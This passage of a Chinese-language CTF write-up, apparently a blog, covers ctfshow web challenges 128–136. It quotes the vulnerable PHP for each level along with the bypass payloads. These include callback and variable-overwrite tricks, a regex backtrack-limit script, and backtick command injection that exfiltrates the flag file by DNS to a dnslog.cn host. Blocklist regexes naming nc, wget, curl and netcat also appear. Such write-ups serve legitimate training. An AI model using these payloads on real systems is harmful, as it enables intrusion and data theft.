variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/[0-9]|[a-z]/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>call_user_func () 回调函数，看到这个函数自然想到使得第一个参数称为一个危险函数，但是 check 将所有的数字字母都过滤了，但是这里没有过滤符号，想到有一个奇怪的东西_()，_()==gettext () 是 gettext () 的拓展函数，开启 text 扩展。需要 php 扩展目录下有 php_gettext.dll</p>\n<p><strong>get_defined_vars()</strong> 函数返回由所有已定义变量所组成的数组。</p>\n<p>当正常的 gettext (“get_defined_vars”); 时会返还 get_defined_vars，外层的回调函数再调用 get_defined_vars 打印所有已经定义的变量</p>\n<p>payload: ?f1=_&amp;f2=get_defined_vars</p>\n<h2 id=\"web129\"><a class=\"anchor\" href=\"#web129\">#</a> web129</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">readfile</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>stripos () 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。这里直接目录穿越即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215201702900.png\" alt=\"image-20230215201702900\" /></p>\n<h2 id=\"web130\"><a class=\"anchor\" href=\"#web130\">#</a> web130</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/.+?ctfshow/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bye!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'ctfshow'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bye!!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215201952640.png\" alt=\"image-20230215201952640\" /></p>\n<p>这里的是.+?，所以是 ctfshow 前面至少加一个东西才能匹配到，直接传 ctfshow 即可，或者数组绕过，stripos 不处理数组</p>\n<h2 id=\"web131\"><a class=\"anchor\" href=\"#web131\">#</a> web131</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'f'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/.+?ctfshow/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bye!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stripos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'36Dctfshow'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token constant boolean\">FALSE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bye!!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>str_repeat () 函数把字符串重复指定的次数。</p>\n<p>PHP 为了防止正则表达式的拒绝服务击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false, 这样就可以绕过第一个正则表达式了</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url<span class=\"token operator\">=</span><span class=\"token string\">\"http://151cbf5e-eff1-412c-98b3-a1fc814ced40.challenge.ctf.show/\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string\">\"f\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">1000000</span><span class=\"token operator\">+</span><span class=\"token string\">\"36Dctfshow\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215204538988.png\" alt=\"image-20230215204538988\" /></p>\n<h1 id=\"后篇\"><a class=\"anchor\" href=\"#后篇\">#</a> 后篇</h1>\n<h2 id=\"web132\"><a class=\"anchor\" href=\"#web132\">#</a> web132</h2>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215205118383.png\" alt=\"image-20230215205118383\" /></p>\n<p>扫描得到，访问 admin</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#error_reporting(0);</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">String</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span> <span class=\"token operator\">===</span> <span class=\"token function\">mt_rand</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x36D</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">||</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>       </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里有 ||，只需要满足前面两个或者后面一个即可，所以这里给 username 传入一个 admin 绕过</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215210142212.png\" alt=\"image-20230215210142212\" /></p>\n<h2 id=\"web133\"><a class=\"anchor\" href=\"#web133\">#</a> web133</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//flag.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'F'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/system|nc|wget|exec|passthru|netcat/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$F</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"6个字母都还不够呀?!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>本题 emmm 长度限制为 6，危险函数限制，这里构造一个</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string backtick-quoted-string\">`$F`</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>注意这里后面是有空格的，刚好 6 个字符，就可以通过反引号执行命令，但是执行完命令后发现没有回显<span class=\"exturl\" data-url=\"aHR0cDovL2Ruc2xvZy5jbi8=\"> DNSLog Platform</span> 通过这个在线工具，带出回显的结果</p>\n<p>payload：</p>\n<pre><code>?F=`$F`;+ping `cat flag.php|grep ctfshow`.cez6di.dnslog.cn -c 1\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230216002935763.png\" alt=\"image-20230216002935763\" /></p>\n<h2 id=\"web134\"><a class=\"anchor\" href=\"#web134\">#</a> web134</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$key1</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$key2</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nonononono\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>@<span class=\"token function\">parse_str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'QUERY_STRING'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key1</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'36d'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$key2</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'36d'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>extract () : 将数组转换为多个变量</p>\n<p>$_SERVER ['QUERY_STRING'] 获取 URL 数据，将数据转换为数组，获取单个数组元素</p>\n<p>parse_str () 函数把查询字符串解析到变量中</p>\n<p>payload:</p>\n<pre><code>?_POST[key1]=36d&amp;_POST[key2]=36d\n</code></pre>\n<h2 id=\"web135\"><a class=\"anchor\" href=\"#web135\">#</a> web135</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">//flag.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span> <span class=\"token operator\">=</span> @<span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'F'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$F</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$F</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"师傅们居然破解了前面的，那就来一个加强版吧\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这一题是 web133 的 “升级” 版本，打开文件的命令都被 ban 了</p>\n<pre><code>?F=`$F`;+cp%20flag.php%201.txt\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230216213028644.png\" alt=\"image-20230216213028644\" /></p>\n<h2 id=\"web136\"><a class=\"anchor\" href=\"#web136\">#</a> web136</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token 